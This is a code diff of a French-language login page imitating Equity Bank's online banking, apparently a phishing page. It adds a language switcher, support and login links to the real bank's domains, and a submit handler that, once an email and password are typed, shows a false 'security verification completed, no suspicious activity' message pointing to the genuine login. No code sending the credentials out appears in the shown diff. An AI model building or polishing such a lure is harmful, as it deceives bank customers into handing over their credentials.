@@ -162,80 +162,72 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
     color: #6a0b0b !important;
 }
 
-/* --------------------- RESPONSIVE MOBILE AMÉLIORÉ --------------------- */
+/* --------------------- RESPONSIVE MOBILE --------------------- */
 @media (max-width: 480px) {
     body {
         height: 100vh;
-        overflow: hidden;
-        display: flex;
-        flex-direction: column;
+        overflow-y: auto;
+        padding-bottom: 0;
     }
 
     #mainContent {
-        flex: 1;
-        overflow-y: auto;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        padding-bottom: 70px; /* espace pour la barre fixe */
+        opacity: 1;
     }
 
     .svg-container {
-        position: relative;
-        top: 0;
-        left: 50%;
-        width: 90%;
-        max-width: 350px;
-        transform: translateX(-50%);
-        height: auto;
+        position: relative !important;
+        top: 0 !important;
+        left: 50% !important;
+        width: 90% !important;
+        max-width: 350px !important;
+        transform: translateX(-50%) scaleX(1) !important;
+        height: auto !important;
+        margin: 0 auto !important;
         z-index: -1;
-        margin: 20px 0 0 0;
-    }
-
-    .left-message {
-        position: relative;
-        left: 50%;
-        top: auto;
-        transform: translateX(-50%);
-        text-align: center;
-        max-width: 90%;
-        margin: 15px auto;
     }
 
     .login-wrapper {
-        position: relative;
-        top: auto;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 90%;
-        max-width: 350px;
-        box-sizing: border-box;
-        margin: 20px 0;
+        position: relative !important;
+        top: auto !important;
+        left: 50% !important;
+        transform: translateX(-50%) !important;
+        margin: 20px auto !important;
+        width: 90% !important;
+        max-width: 350px !important;
+    }
+
+    .left-message {
+        position: relative !important;
+        left: 50% !important;
+        top: auto !important;
+        transform: translateX(-50%) !important;
+        text-align: center !important;
+        max-width: 90% !important;
+        margin: 15px auto !important;
     }
 
     .login-bottom-buttons {
-        position: fixed;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        display: flex;
-        justify-content: space-around;
-        padding: 10px 0;
-        background: white;
+        position: fixed !important;
+        bottom: 0 !important;
+        left: 0 !important;
+        width: 100% !important;
+        display: flex !important;
+        justify-content: space-around !important;
+        padding: 10px 0 !important;
+        background: white !important;
+        z-index: 5 !important;
         box-shadow: 0 -2px 6px rgba(0,0,0,0.1);
-        z-index: 5;
     }
 
     .login-bottom-buttons .language-btn,
     .login-bottom-buttons .support-btn {
-        width: 50px;
-        height: 50px;
-        border-radius: 50%;
-        margin: 0;
+        width: 50px !important;
+        height: 50px !important;
+        margin: 0 !important;
     }
 
     #selectedLanguage, #languageArrow {
-        display: none;
+        display: none !important;
     }
 }
 </style>
@@ -322,29 +314,19 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
             <img src="images/globe.png">
             <span id="selectedLanguage">Français</span>
             <svg id="languageArrow" width="12" height="8" viewBox="0 0 12 8" fill="none">
-                     <path d="M1 1L6 6L11 1" stroke="#6a0b0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M1 1L6 6L11 1" stroke="#8B1C1C" stroke-width="2"/>
             </svg>
         </button>
-        <button class="support-btn">
+        <button class="support-btn" onclick="window.open('https://equitygroupholdings.com/cd/', '_blank')">
             <img src="images/chat.png">
         </button>
     </div>
 
-    <!-- POP-UP CONFIRMATION (exemple) -->
-    <div class="overlay" id="overlay"></div>
-    <div class="popup" id="confirmationPopup">
-        <span class="close-x" id="closePopup">&times;</span>
-        <div class="popup-header">Vérification de sécurité</div>
-        <div class="popup-subtitle">
-            Vérification de sécurité terminée avec succès. Toutes les informations de votre compte ont été vérifiées et aucune activité suspecte n’a été détectée.
-        </div>
-        <div style="text-align:center; margin-top:10px;">
-            <a href="#">Continuer</a>
-        </div>
-    </div>
+    <!-- Overlay sombre -->
+    <div id="overlay" class="overlay"></div>
 
-    <!-- LOADER POP-UP -->
-    <div class="popup-loader" id="popupLoader">
+    <!-- Loader Pop-up Confirmation -->
+    <div id="popupLoader" class="popup-loader">
         <div class="circle">
             <div class="dot dot1"></div>
             <div class="dot dot2"></div>
@@ -352,62 +334,137 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
             <div class="dot dot4"></div>
         </div>
     </div>
-</div>
+
+    <!-- Pop-up Langue -->
+    <div id="languagePopup" class="popup">
+        <div class="close-x">×</div>
+        <div class="popup-header">Langue</div>
+        <div class="popup-subtitle">Sélectionnez votre langue préférée</div>
+        <div class="popup-subtitle small">Chagua lugha / Hitamo ururimi / Sélectionnez la langue</div>
+        <div class="language-options">
+            <label class="option">
+                English
+                <input type="radio" name="lang" value="English">
+                <span class="custom-radio"><span class="checkmark"></span></span>
+            </label>
+            <div class="separator"></div>
+            <label class="option">
+                Français
+                <input type="radio" name="lang" value="Français" checked>
+                <span class="custom-radio"><span class="checkmark"></span></span>
+            </label>
+        </div>
+    </div>
+
+    <!-- Pop-up Confirmation Sécurité -->
+    <div id="confirmationPopup" class="popup">
+        <div class="close-x">×</div>
+        <div class="popup-header">Confirmation</div>
+        <div class="popup-subtitle">
+            Vérification de sécurité terminée avec succès. Toutes les informations de votre compte ont été vérifiées et aucune activité suspecte n’a été détectée.<br>
+            <a href="https://equitybcdconline.equitygroupholdings.com/fr-FR/access/login">Connectez-vous pour terminer le processus de sécurité</a>
+        </div>
+    </div>
+
+</div><!-- /mainContent -->
 
 <script>
-// --------------------- LOADER INITIAL ---------------------
-window.addEventListener('load', () => {
-    const loader = document.getElementById('loaderWrapper');
+// ====== LOADER INITIAL ======
+setTimeout(() => {
     const logo = document.getElementById('logo');
-    const mainContent = document.getElementById('mainContent');
-
-    logo.style.opacity = '1';
+    logo.style.opacity = 1;
     logo.style.transform = 'translate(-50%, -50%) scale(1)';
-    setTimeout(() => {
-        loader.style.display = 'none';
-        mainContent.style.opacity = '1';
-    }, 1500);
-});
+}, 1300);
+setTimeout(() => {
+    document.getElementById("loaderWrapper").style.display = "none";
+    document.getElementById("mainContent").style.opacity = 1;
+}, 2600);
 
-// --------------------- TOGGLE MOT DE PASSE ---------------------
+// ====== FORMULAIRE & BUTTON ======
+const emailInput = document.querySelector('input[type="text"]');
+const passwordInput = document.getElementById('passwordField');
+const submitBtn = document.querySelector('button.submit-btn');
+function toggleButton() {
+    if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') submitBtn.classList.add('active');
+    else submitBtn.classList.remove('active');
+}
+emailInput.addEventListener('input', toggleButton);
+passwordInput.addEventListener('input', toggleButton);
+toggleButton();
+
+// ====== TOGGLE MOT DE PASSE (OEIL PARFAIT) ======
 const toggleEye = document.getElementById('toggleEye');
-const passwordField = document.getElementById('passwordField');
 toggleEye.addEventListener('click', () => {
-    if(passwordField.type === 'password'){
-        passwordField.type = 'text';
+    const line = toggleEye.querySelector('line'); 
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        line.style.opacity = "0";
     } else {
-        passwordField.type = 'password';
+        passwordInput.type = 'password';
+        line.style.opacity = "1";
     }
 });
 
-// --------------------- FORMULAIRE ---------------------
+// ====== POP-UP LANGUE ======
+const overlay = document.getElementById('overlay');
+const languageBtn = document.querySelector('.language-btn');
+const languagePopup = document.getElementById('languagePopup');
+const languageClose = languagePopup.querySelector('.close-x');
+const languageRadios = document.querySelectorAll('input[name="lang"]');
+languageBtn.addEventListener('click', () => {
+    overlay.classList.add('active');
+    languagePopup.classList.add('active');
+});
+languageClose.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    languagePopup.classList.remove('active');
+});
+const translations = {
+  "Français": { loginTitle: "S'identifier", loginDesc: "Connectez-vous pour continuer. N'oubliez pas que votre mot de passe est le vôtre, ne le communiquez à personne.", emailPlaceholder: "Adresse électronique ou numéro de téléphone portable", passwordPlaceholder: "Inscrire votre mot de passe", forgot: "Mot de passe oublié ?", submit: "S'identifier" },
+  "English": { loginTitle: "Sign In", loginDesc: "Log in to continue. Remember your password is yours, do not share it with anyone.", emailPlaceholder: "Email address or phone number", passwordPlaceholder: "Enter your password", forgot: "Forgot password?", submit: "Sign In" }
+};
+const selectedLanguageSpan = document.getElementById('selectedLanguage');
+const loginTitleElem = document.querySelector('.login-area h1');
+const loginDescElem = document.querySelector('.login-area .description');
+const forgotLink = document.querySelector('.forgot');
+languageRadios.forEach(radio => {
+  radio.addEventListener('change', () => {
+    const lang = radio.value;
+    selectedLanguageSpan.textContent = lang;
+    loginTitleElem.textContent = translations[lang].loginTitle;
+    loginDescElem.textContent = translations[lang].loginDesc;
+    emailInput.placeholder = translations[lang].emailPlaceholder;
+    passwordInput.placeholder = translations[lang].passwordPlaceholder;
+    forgotLink.textContent = translations[lang].forgot;
+    submitBtn.textContent = translations[lang].submit;
+    overlay.classList.remove('active');
+    languagePopup.classList.remove('active');
+  });
+});
+
+// ====== POP-UP CONFIRMATION ======
+const confirmationPopup = document.getElementById('confirmationPopup');
+const confirmationClose = confirmationPopup.querySelector('.close-x');
+const popupLoader = document.getElementById('popupLoader');
+function showConfirmationPopup() {
+    overlay.classList.add('active');
+    popupLoader.style.display = 'block';
+    setTimeout(() => {
+        popupLoader.style.display = 'none';
+        confirmationPopup.classList.add('active');
+    }, 1500);
+}
+confirmationClose.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    confirmationPopup.classList.remove('active');
+});
+
+// ====== FORMULAIRE SUBMIT ======
 const loginForm = document.getElementById('loginForm');
-const submitBtn = loginForm.querySelector('.submit-btn');
-loginForm.addEventListener('input', () => {
-    if(loginForm.checkValidity()){
-        submitBtn.classList.add('active');
-    } else {
-        submitBtn.classList.remove('active');
-    }
-});
-
 loginForm.addEventListener('submit', (e) => {
     e.preventDefault();
-    // Affiche loader pop-up
-    document.getElementById('popupLoader').style.display = 'block';
-    setTimeout(() => {
-        document.getElementById('popupLoader').style.display = 'none';
-        document.getElementById('overlay').classList.add('active');
-        document.getElementById('confirmationPopup').classList.add('active');
-    }, 1500);
-});
-
-// --------------------- FERMER POP-UP ---------------------
-document.getElementById('closePopup').addEventListener('click', () => {
-    document.getElementById('overlay').classList.remove('active');
-    document.getElementById('confirmationPopup').classList.remove('active');
+    if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') showConfirmationPopup();
 });
 </script>
-
 </body>
 </html>
